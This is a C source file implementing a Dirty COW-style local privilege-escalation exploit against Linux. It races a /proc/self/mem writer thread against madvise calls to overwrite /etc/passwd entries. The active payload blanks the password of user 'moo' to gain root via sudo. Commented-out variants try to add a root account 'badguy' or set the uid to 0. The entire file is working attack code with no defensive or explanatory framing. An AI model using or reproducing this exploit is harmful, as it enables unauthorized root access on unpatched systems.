#include <stdlib.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>

struct payload_info {
	char *string;
	//size_t size;
	off_t file_offset;
	void *loc_in_mem;
};

typedef struct payload_info PayloadInfo;


// Write payload to mmap'd memory
void *writerThread(void *arg) {
	PayloadInfo *info = (PayloadInfo *) arg;
	char *str = info->string;

	int fd = open("/proc/self/mem", O_RDWR);

	for (int i = 0; i < 10000; i++) {
		lseek(fd, (uintptr_t) info->loc_in_mem + info->file_offset, SEEK_SET);
		write(fd, str, strlen(str));
	}
}

// Advise kernel to drop mapping
void *madviserThread(void *arg) {
	PayloadInfo *info = (PayloadInfo *) arg;
	for (int i = 0; i < 10000; i++) {
		madvise(info->loc_in_mem, 100, MADV_DONTNEED);
	}
}

int main() {
	int fd = open ("/etc/passwd", O_RDONLY);
	struct stat file_info;
	fstat(fd, &file_info);

	PayloadInfo info;

	// Attempt to hard-code scripts/edit-passwd  !!! NOT WORKING: unable to append to file !!!
	//info.string = "badguy:5/tk2PeameNik:0:0:root:/root:/bin/bash\n";
	//info.loc_in_mem = mmap(NULL, file_info.st_size + strlen(info.string), PROT_READ, MAP_PRIVATE, fd, 0);
	//info.file_offset = 0x745;

	// Modify userid and group to 0: not working in ubuntu-14.04.3-desktop-i386.iso, with user "moo"
	//info.string = "moo:x:0:0:moo,,,:/home/moo:/bin/bash\n\n\n\n\n\n\n\n";
	//info.loc_in_mem = mmap(NULL, file_info.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	//info.file_offset = 0x71A;

	// Make current user passwordless, able to use "sudo su" to gain root access
	info.string = "moo:*:";
	info.loc_in_mem = mmap(NULL, file_info.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	info.file_offset = 0x71A;

	pthread_t thread_1, thread_2;
	pthread_create(&thread_1, NULL, madviserThread, &info);
	pthread_create(&thread_2, NULL, writerThread, &info);

	pthread_join(thread_1, NULL);
	pthread_join(thread_2, NULL);

	return EXIT_SUCCESS;
}
